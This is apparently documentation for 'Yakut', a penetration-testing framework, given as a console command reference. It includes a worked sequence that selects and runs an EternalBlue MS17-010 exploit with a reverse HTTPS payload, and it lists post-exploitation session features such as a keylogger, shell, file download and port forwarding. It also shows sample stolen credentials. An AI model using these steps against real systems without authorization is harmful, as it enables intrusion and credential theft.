# Common Commands

This section provides a detailed reference for the common commands used within the
Yakut console. These commands allow you to manage workspaces, targets, capabilities, sessions,
loot and the framework itself.

_Tip: Remember to utilize the tab completion extensively in the Yakut console. It will help you discover commands, sub-commands, capability paths and known values._

- [Common Commands](#common-commands)
- [1. Workspace Management Commands](#1-workspace-management-commands)
    - [`workspace` or `workspace list`](#workspace-or-workspace-list)
    - [`workspace create <name> [--description "your description"]`](#workspace-create-name---description-your-description)
    - [`workspace use <name_or_id>`](#workspace-use-name_or_id)
    - [`workspace info <name_or_id>`](#workspace-info-name_or_id)
    - [`workspace delete <name_or_id>`](#workspace-delete-name_or_id)
    - [`workspace scope define [--include <ranges>] [--exclude <ranges>] [--notes "<text>"]`](#workspace-scope-define---include-ranges---exclude-ranges---notes-text)
    - [`workspace scope show <name_or_id>`](#workspace-scope-show-name_or_id)
- [2. Target Management Commands](#2-target-management-commands)
    - [`target add <ip_or_host_or_url> [--os <os>] [--hostname <name>] [--tags "tag1,tag2"] [--notes "<text>"]`](#target-add-ip_or_host_or_url---os-os---hostname-name---tags-tag1tag2---notes-text)
    - [`target list [--os <os>] [--port <port>] [--service <svc>] [--vuln <cve_id>] [--tags "tag"] [--ip <range>]` or `targets`](#target-list---os-os---port-port---service-svc---vuln-cve_id---tags-tag---ip-range-or-targets)
    - [`target show <id_or_ip_or_hostname>`](#target-show-id_or_ip_or_hostname)
    - [`target update <id_or_ip_or_hostname> --os <new_os> --tags "new_tags" --notes "<new_notes>"`](#target-update-id_or_ip_or_hostname---os-new_os---tags-new_tags---notes-new_notes)
    - [`target delete <id_or_ip_or_hostname>`](#target-delete-id_or_ip_or_hostname)
    - [`target <id_or_ip_or_hostname> services list|add|update|delete [service_options]`](#target-id_or_ip_or_hostname-services-listaddupdatedelete-service_options)
    - [`target <id_or_ip_or_hostname> vulns list|add|update|delete [vuln_options]`](#target-id_or_ip_or_hostname-vulns-listaddupdatedelete-vuln_options)
- [3. Module Interaction Commands](#3-module-interaction-commands)
    - [`capability search <keyword> [type:<type>] [platform:<platform>] [cve:<id>] [tag:<tag>] [name:<text>]`](#capability-search-keyword-typetype-platformplatform-cveid-tagtag-nametext)
    - [`capability info <capability_refname>`](#capability-info-capability_refname)
    - [`capability use <capability_refname>` or `use <capability_refname>`](#capability-use-capability_refname-or-use-capability_refname)
    - [`capability options` or `options` (within capability context)](#capability-options-or-options-within-capability-context)
    - [`capability options set <OPTION_NAME> <value>` or `set <OPTION_NAME> <value>` (within capability context)](#capability-options-set-option_name-value-or-set-option_name-value-within-capability-context)
    - [`capability options payload <payload_refname>` or `set PAYLOAD <payload_refname>` (for exploit capabilities)](#capability-options-payload-payload_refname-or-set-payload-payload_refname-for-exploit-capabilities)
    - [`payload options` or `poptions` (within capability context, after a payload is set)](#payload-options-or-poptions-within-capability-context-after-a-payload-is-set)
    - [`payload options set <OPTION_NAME> <value>` or `pset <OPTION_NAME> <value>` (within capability context)](#payload-options-set-option_name-value-or-pset-option_name-value-within-capability-context)
    - [`capability check` or `check` (within capability context, if capability supports it)](#capability-check-or-check-within-capability-context-if-capability-supports-it)
    - [`capability run [--async]` or `run [--async]` or `exploit [--async]` (within capability context)](#capability-run---async-or-run---async-or-exploit---async-within-capability-context)
    - [`back`](#back)
    - [`capability reload_paths`](#capability-reload_paths)
- [4. Session Management Commands](#4-session-management-commands)
    - [`sessions list` or `sessions`](#sessions-list-or-sessions)
    - [`sessions interact` or `session <session_id>`](#sessions-interact-or-session-session_id)
    - [Within Session Context - Examples for a `yakut_agent` session:](#within-session-context---examples-for-a-yakut_agent-session)
    - [`sessions kill <session_id>`](#sessions-kill-session_id)
- [5. Loot Management Commands](#5-loot-management-commands)
    - [`loot list [--type <type>] [--service <svc>] [--keyword <text>]` or `loot`](#loot-list---type-type---service-svc---keyword-text-or-loot)
    - [`loot add <type> --host <host_or_id> [--service <service>] [--user <user>] [--secret "<data>"] [--file <local_file_path>] [--notes "<text>"]`](#loot-add-type---host-host_or_id---service-service---user-user---secret-data---file-local_file_path---notes-text)

# 1. Workspace Management Commands

### `workspace` or `workspace list`

Lists all available workspaces.

```console
yakut > workspace list
[*] Workspaces:
ID  Name                  Targets  Loot Items  Created      Updated      Active
--  ----                  -------  ----------  -------      -------      ------
1   Client_Alpha_Pentest  15       42          2025-05-01   2025-05-14   *
2   Research_Project_X    5        8           2025-04-20   2025-05-10
3   Default               0        0           2025-03-01   2025-03-01
```

### `workspace create <name> [--description "your description"]`

```console
yakut > workspace create "ACME_Corp_Internal" --description "Internal network pentest for ACME Corp - Q2 2025"
[+] Workspace 'ACME_Corp_Internal' created successfully.
yakut > workspace use "ACME_Corp_Internal"
[*] Switched to workspace: ACME_Corp_Internal
yakut [ws:ACME_Corp_Internal] >
```

### `workspace use <name_or_id>`

```console
yakut [ws:ACME_Corp_Internal] > workspace use Default
[*] Switched to workspace: Default
yakut [ws:Default] >
```

### `workspace info <name_or_id>`

```console
yakut [ws:Client_Alpha_Pentest] > workspace info
[*] Workspace Details:
  Name: Client_Alpha_Pentest
  ID: 1
  Description: Internal and external assessment for Client Alpha.
  Created: 2025-05-01 10:00:00 UTC
  Updated: 2025-05-14 18:30:00 UTC
  Targets: 15
  Services: 75
  Vulnerabilities: 12
  Loot Items: 42
  Scope Defined: Yes
```

### `workspace delete <name_or_id>`

```console
yakut > workspace delete "Old_Research"
[!] Are you sure you want to delete workspace "Old_Research" and all its data? (yes/no): yes
[+] Workspace "Old_Research" deleted successfully.
```

### `workspace scope define [--include <ranges>] [--exclude <ranges>] [--notes "<text>"]`

```console
yakut [ws:Client_Alpha_Pentest] > workspace scope define --include "192.168.1.0/24, app.clientalpha.com" --exclude "192.168.1.254" --notes "Internal network and primary web app. No DoS on .254."
[+] Scope updated for workspace 'Client_Alpha_Pentest'.
```

### `workspace scope show <name_or_id>`

```console
yakut [ws:Client_Alpha_Pentest] > workspace scope show
[*] Scope for Workspace: Client_Alpha_Pentest
  Includes:
    - 192.168.1.0/24
    - app.clientalpha.com
  Excludes:
    - 192.168.1.254
  Notes: Internal network and primary web app. No DoS on .254.
```

---

# 2. Target Management Commands

### `target add <ip_or_host_or_url> [--os <os>] [--hostname <name>] [--tags "tag1,tag2"] [--notes "<text>"]`

```console
yakut [ws:ACME_Corp_Internal] > target add 10.10.20.5 --os "Windows Server 2019" --hostname "DC01" --tags "DomainController,Critical"
[+] Target 10.10.20.5 (DC01) added.
yakut [ws:ACME_Corp_Internal] > target add https://webapp.acme.corp --tags "WebApp,External"
[+] Target https://webapp.acme.corp added.
```

### `target list [--os <os>] [--port <port>] [--service <svc>] [--vuln <cve_id>] [--tags "tag"] [--ip <range>]` or `targets`

```console
yakut [ws:ACME_Corp_Internal] > target list --os Windows --port 445
[*] Targets matching criteria:
  ID Address       Hostname  OS                    Tags
  -- --------      --------  --                    ----
  1  10.10.20.5     DC01      Windows Server 2019  DomainController,Critical
  ...
```

### `target show <id_or_ip_or_hostname>`

```console
yakut [ws:ACME_Corp_Internal] > target show DC01
[*] Target Details: DC01 (10.10.20.5)
  ID: 1
  OS: Windows Server 2019
  Tags: DomainController,Critical
  Services: 5 - Use 'target DC01 services list' for details
  Vulnerabilities: 2 - Use 'target DC01 vulns list' for details
  Loot: 1 - Use 'target DC01 loot list' for details
  Notes: Primary domain controller. Do not reboot without permission.
```

### `target update <id_or_ip_or_hostname> --os <new_os> --tags "new_tags" --notes "<new_notes>"`

```console
yakut [ws:ACME_Corp_Internal] > target update DC01 --tags "DomainController,Critical,Patched_MS17010"
[+] Target DC01 updated.
```

### `target delete <id_or_ip_or_hostname>`

```console
yakut [ws:ACME_Corp_Internal] > target delete 10.10.20.100
[+] Target 10.10.20.100 removed.
```

### `target <id_or_ip_or_hostname> services list|add|update|delete [service_options]`

```console
yakut [ws:ACME_Corp_Internal] > target DC01 services add --port 80 --proto tcp --name http --product "Microsoft IIS 10.0"
[+] Service http (tcp/80) added to target DC01.
yakut [ws:ACME_Corp_Internal] > target DC01 services list
```

### `target <id_or_ip_or_hostname> vulns list|add|update|delete [vuln_options]`

```console
yakut [ws:ACME_Corp_Internal] > target DC01 vulns add --name "MS17-010" --cve CVE-2017-0144 --port 445 --risk High --description "SMB RCE"
[+] Vulnerability MS17-010 added to target DC01.
```

---

# 3. Module Interaction Commands

### `capability search <keyword> [type:<type>] [platform:<platform>] [cve:<id>] [tag:<tag>] [name:<text>]`

```console
yakut > cap search eternalblue type:exploit platform:windows
[*] Modules matching 'eternalblue type:exploit platform:windows':
RefName                                Title                          Reliability  Impact
-------                                -----                          -----------  ------
exploit/windows/smb/eternalblue_ms17010 MS17-010 EternalBlue SMB RCE   Excellent   Critical
```

### `capability info <capability_refname>`

```console
yakut > capability info exploit/windows/smb/eternalblue_ms17010
[*] Module Information: exploit/windows/smb/eternalblue_ms17010
  Title: MS17-010 EternalBlue SMB RCE
  Description: This capability exploits the MS17-010 vulnerability...
  Authors: [NaughtyDev1, HackerGal2]
  License: MIT
  Platform: windows
  Arch: [amd64, aarch64]
  Reliability: Excellent
  Impact: Critical
  OPSEC Rating: Moderate
  Cleanup Available: No
  References:
    - CVE-2017-0144
    - MSB-MS17-010
    - https://example.com/eternalblue_details
  Targets:
    0: Automatic Target
  Options:
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    RHOSTS                     yes       The target address(es)
    RPORT     445              yes       The target port (TCP)
    SMBDomain .                no        The Windows domain to use for SMB authentication
    ...
  Payload Information:
    Space: 2048 bytes
    BadChars: \x00\x0a\x0d
    ...
```

### `capability use <capability_refname>` or `use <capability_refname>`

```console
yakut > cap use exploit/windows/smb/eternalblue_ms17010
yakut [exploit/windows/smb/eternalblue_ms17010] >
```

### `capability options` or `options` (within capability context)

```console
yakut [exploit/windows/smb/eternalblue_ms17010] > options
Module options (exploit/windows/smb/eternalblue_ms17010):

  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  RHOSTS                     yes       The target address(es)
  RPORT     445              yes       The target port (TCP)
  SMBDomain .                no        The Windows domain to use for SMB authentication
  ...

  Payload options (payload/windows/x64/yakut_agent/reverse_https): # Assuming a payload is selected

  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  LHOST                      yes       The listen address (for reverse connections)
  LPORT     443              yes       The listen port (for reverse connections)
  ...

```

### `capability options set <OPTION_NAME> <value>` or `set <OPTION_NAME> <value>` (within capability context)

```console
yakut [exploit/windows/smb/eternalblue_ms17010] > set RHOSTS 10.10.10.150
RHOSTS => 10.10.10.150
```

### `capability options payload <payload_refname>` or `set PAYLOAD <payload_refname>` (for exploit capabilities)

```console
yakut [exploit/windows/smb/eternalblue_ms17010] > set PAYLOAD windows/x64/yakut_agent/reverse_https
PAYLOAD => windows/x64/yakut_agent/reverse_https
```

### `payload options` or `poptions` (within capability context, after a payload is set)

```console
yakut [exploit/windows/smb/eternalblue_ms17010] > payload options
Payload options (windows/x64/yakut_agent/reverse_https):
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  LHOST                    yes       The listen address
  LPORT   4433             yes       The listen port
  ...
```

### `payload options set <OPTION_NAME> <value>` or `pset <OPTION_NAME> <value>` (within capability context)

```console
yakut [exploit/windows/smb/eternalblue_ms17010] > pset LHOST eth0
LHOST => eth0
```

### `capability check` or `check` (within capability context, if capability supports it)

```console
yakut [exploit/windows/smb/eternalblue_ms17010] > check
[*] 10.10.10.150:445 - Checking for MS17-010 vulnerability...
[+] 10.10.10.150:445 - The target appears to be vulnerable to MS17-010 (EternalBlue).
```

### `capability run [--async]` or `run [--async]` or `exploit [--async]` (within capability context)

```console
yakut [exploit/windows/smb/eternalblue_ms17010] > run
[*] 10.10.10.150:445 - Launching exploit for MS17-010...
[+] 10.10.10.150:445 - Exploit successful! YakutAgent session 1 opened (192.168.1.10:4433 -> 10.10.10.150:49152)
```

### `back`

Exits the current capability (or session) context and returns to the previous context (usually global or workspace).

```console
yakut [exploit/windows/smb/eternalblue_ms17010] > back
yakut [ws:ACME_Corp_Internal] >
```

### `capability reload_paths`

```console
yakut > capability reload_paths
[*] Reloading capabilities from all paths...
[+] Found 5 new capabilities.
```

---

# 4. Session Management Commands

### `sessions list` or `sessions`

```console
yakut > sessions list
[*] Active sessions:
  ID  Type        Info                         Tunnel/Via   Target        User   Workspace
  --  ----        ----                         ----------   ------        ----   ---------
  1   yakut_agent Yakut Agent v0.1 (Ruby/Win)  L:eth0:4433  10.10.10.150  SYSTEM ACME_Corp_Internal
  2   shell       /bin/bash                    L:eth0:4444  10.10.20.30  www-data ACME_Corp_Internal
```

### `sessions interact` or `session <session_id>`

```console
yakut > sessions interact 1
[*] Starting interaction with session 1 (10.10.10.150:yakut_agent)...
yakut [session:1 (10.10.10.150:yakut_agent)] >
```

### Within Session Context - Examples for a `yakut_agent` session:

- `help`: List available session commands.
- `sysinfo`: Get target system information.
- `shell`: Drop into a system command shell on the target.
- `execute <command> [args...]`: Execute a command on the target.
- `ps`: List processes.
- `migrate <pid>`: Migrate the agent to another process.
- `upload <local_path> <remote_path>`: Upload a file to the target.
- `download <remote_path> [local_path]`: Download a file from the target.
- `screenshot`: Take a screenshot of the target's desktop.
- `keyscan_start` / `keyscan_dump` / `keyscan_stop`: Keylogger functionality.
- `portfwd add -L <local_port> -r <remote_host> -p <remote_port>`: Setup port forwarding.
- `capability use post/...`: Load and run post-exploitation capabilities within the session context.
- `background` or `bg`: Background the current session and return to the previous Yakut context.
- `close` or `exit`: Terminate the current session.

### `sessions kill <session_id>`

```console
yakut > sessions kill 2
[*] Killing session 2...
[+] Session 2 closed.
```

---

# 5. Loot Management Commands

### `loot list [--type <type>] [--service <svc>] [--keyword <text>]` or `loot`

```console
yakut [ws:ACME_Corp_Internal] > loot list --type creds --service ssh
[*] Loot matching criteria:
  ID  Workspace            Host        Service  User  Secret/Data  Timestamp           Notes
  --  ---------            ----        -------  ----  -----------  ---------           -----
  5   ACME_Corp_Internal   10.10.20.5  ssh      root  toor123!     2025-05-15 01:20:00  SSH creds from memory dump
```

### `loot add <type> --host <host_or_id> [--service <service>] [--user <user>] [--secret "<data>"] [--file <local_file_path>] [--notes "<text>"]`

```console
yakut [ws:ACME_Corp_Internal] > loot add creds --host DC01 --service LDAP --user "ACME\administrator" --secret "P@$$wOrd123" --notes "Found in plaintext config file"
[+] Loot item added (ID: 6).
yakut [ws:ACME_Corp_Internal] > loot add file --host "WebApp01" --service http --file "/tmp/webapp_config.xml" --notes "Sensitive webapp config"
[+] Loot item (file) added (ID: 7). File stored: /path/to/workspace/loot/webapp_config_xxxx.xml
```

---

This detailed command reference should give users a solid understanding of how to operate Yakut. As the framework
develops, these commands and their options will be refined and new commands will be added to support Yakut's growing
capabilities.
